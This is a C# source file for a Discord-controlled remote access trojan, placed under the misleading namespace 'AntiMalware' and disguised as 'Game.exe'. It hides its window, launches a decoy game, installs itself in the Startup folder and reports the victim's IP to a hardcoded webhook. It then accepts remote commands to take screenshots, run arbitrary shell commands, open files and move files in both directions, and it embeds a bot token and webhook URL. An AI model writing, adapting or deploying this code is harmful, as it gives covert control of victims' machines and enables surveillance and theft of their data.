using System.Net;
using System.Drawing;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Net.Sockets;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Text;

namespace AntiMalware
{
    class Program
    {
        static DiscordSocketClient client = new DiscordSocketClient();
        static CommandService commands = new CommandService();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
        static string filename = "Game.exe";
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            try
            {
                ShellExecute(IntPtr.Zero, "open", Directory.GetCurrentDirectory() + "\\setting\\Game_.exe", "", "", 1);
            }
            catch { }
            try
            {
                System.IO.File.Copy(Environment.CurrentDirectory + "\\" + filename, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + filename, true);
            }
            catch { }
            System.Diagnostics.Process[] processes = null;
            string scp = System.Diagnostics.Process.GetCurrentProcess().ProcessName.ToUpper();
            processes = System.Diagnostics.Process.GetProcessesByName(scp);
            if (processes.Length > 1) { return; }
            static string get_ip()
            {
                try
                {
                    var host = Dns.GetHostEntry(Dns.GetHostName());
                    foreach (var ip in host.AddressList)
                    {
                        if (ip.AddressFamily == AddressFamily.InterNetwork)
                        {
                            return ip.ToString();
                        }
                    }
                    return "error";
                }
                catch
                {
                    return "error";
                }
            }
            var client_ = new HttpClient();
            var SuccessWebHook = new
            {
                username = get_ip(),
                content = "injected"
            };
            string EndPoint = @"https://discord.com/api/webhooks/1206647833210658847/vWsND7ZbJAYpnyZP6LEI1WeP_p1sw1q8Z5xkRuPeN9MGAdkt7wpVjnQxzMt2yHr62Uoc";
            StringContent content = new StringContent(JsonConvert.SerializeObject(SuccessWebHook), Encoding.UTF8, "application/json");
            client_.PostAsync(EndPoint, content).Wait();
            static string split_sum(string[] content)
                {
                    int a = 0;
                    string output = "";
                    foreach (string line in content) {
                        if (a >= 2)
                        {
                            output += line + " ";
                            }
                        a++;
                        }    
                    return output;
                }
        static string screenshot()
            {
                Bitmap screenshot = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                using (Graphics gr = Graphics.FromImage(screenshot))
                {
                    gr.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                }
                string path = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
                FileInfo f1 = new FileInfo(path + "\\screenshot.jpg");
                try
                {
                    if (f1.Exists)
                    {
                        f1.Delete();
                    }
                }
                catch
                {
                }
                Thread.Sleep(250);
                Bitmap s = new Bitmap(screenshot);
                s.Save(path + "\\screenshot.jpg");
                return path + "\\screenshot.jpg";
            }
            string ip = get_ip();
            Task OnClientLogReceived(LogMessage msg)
            {
                Console.WriteLine(msg.ToString());  //로그 출력
                return Task.CompletedTask;
            }
            async Task OnClientMessage(SocketMessage arg)
            {
                var message = arg as SocketUserMessage;
                if (message.Author.IsBot) { return; }
                if (message.Author.IsWebhook) { return; }
                if (message == null) { return; }
                if (message.Content == "all")
                {
                    message.Channel.SendMessageAsync(get_ip());
                }
                if (message.Content.Split(" ")[0] == ip){
                    if (message.Content.Split(" ")[1] == "screenshot")
                    {
                        message.Channel.SendFileAsync(screenshot());
                    }
                    if (message.Content.Split(" ")[1] == "open")
                    {
                        try
                        {
                            ShellExecute(IntPtr.Zero, "open", split_sum(message.Content.Split(" ")), "", "", 1);
                        }
                        catch(Exception e)
                        {
                            message.Channel.SendMessageAsync(e.ToString());
                        }
                    }
                    if (message.Content.Split(" ")[1] == "shellscript")
                    {
                        try {
                            Process command = new Process();
                            command.StartInfo.FileName = "cmd.exe";
                            command.StartInfo.Arguments = "/c" + split_sum(message.Content.Split(" "));
                            command.StartInfo.RedirectStandardOutput = true;
                            command.StartInfo.UseShellExecute = false;
                            command.StartInfo.CreateNoWindow = true;
                            command.StartInfo.RedirectStandardError = true;
                            command.StartInfo.RedirectStandardInput = true;
                            command.Start();
                            string msg = command.StandardOutput.ReadToEnd();
                            command.Close();
                            message.Channel.SendMessageAsync(msg);
                        }
                        catch(Exception e)
                        {
                            message.Channel.SendMessageAsync(e.ToString());
                        }
                    }
                    if (message.Content.Split(" ")[1] == "downloadfile")
                    {
                        message.Channel.SendFileAsync(split_sum(message.Content.Split(" ")));
                    }
                    if (message.Content.Split(" ")[1] == "uploadfile")
                    {
                        Console.WriteLine(split_sum(message.Content.Split(" ")));
                        string URL = null;
                        URL = message.Attachments.ElementAt(0).Url;
                        Console.WriteLine(URL);
                        var client = new WebClient();
                        client.DownloadFile(new Uri(URL), split_sum(message.Content.Split(" ")));
                    }
                }
            }
            async Task BotMain()
            {
                client = new DiscordSocketClient(new DiscordSocketConfig()
                {    //디스코드 봇 초기화
                    GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent,
                    LogLevel = LogSeverity.Verbose
                });
                commands = new CommandService(new CommandServiceConfig()        //명령어 수신 클라이언트 초기화
                {
                    LogLevel = LogSeverity.Verbose                              //봇의 로그 레벨 설정
                });

                //로그 수신 시 로그 출력 함수에서 출력되도록 설정
                client.Log += OnClientLogReceived;
                commands.Log += OnClientLogReceived;
                await client.LoginAsync(TokenType.Bot, "MTIwNjE4MDcyODgyNDQwNjA2Nw.GnrxSU.rnteuaYDNUcM6QUerZBEBOjTa8oZ6jNyGmVTU4"); //봇의 토큰을 사용해 서버에 로그인
                await client.StartAsync();                         //봇이 이벤트를 수신하기 시작

                client.MessageReceived += OnClientMessage;         //봇이 메시지를 수신할 때 처리하도록 설정

                await Task.Delay(-1);   //봇이 종료되지 않도록 블로킹
            }
            BotMain().GetAwaiter().GetResult();
        }
    }
}


